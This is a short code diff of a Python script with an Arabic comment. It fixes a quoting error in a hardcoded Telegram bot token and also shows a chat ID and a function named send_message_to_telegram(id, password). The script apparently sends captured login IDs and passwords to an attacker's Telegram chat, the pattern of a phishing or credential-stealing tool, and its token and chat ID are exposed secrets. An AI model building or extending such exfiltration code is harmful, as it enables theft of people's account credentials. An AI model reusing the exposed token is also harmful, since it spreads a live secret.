@@ -7,7 +7,7 @@ import sys
 import time
 
 # استبدل بتوكن البوت الخاص بك ومعرف المحادثة الخاص بك
-TELEGRAM_BOT_TOKEN = 7170560287:AAH6Jx2CGjMrjpzX22EvY7HvBIXI1xsy0no"
+TELEGRAM_BOT_TOKEN = "7170560287:AAH6Jx2CGjMrjpzX22EvY7HvBIXI1xsy0no"
 TELEGRAM_CHAT_ID = "5210419138"
 
 def send_message_to_telegram(id, password):
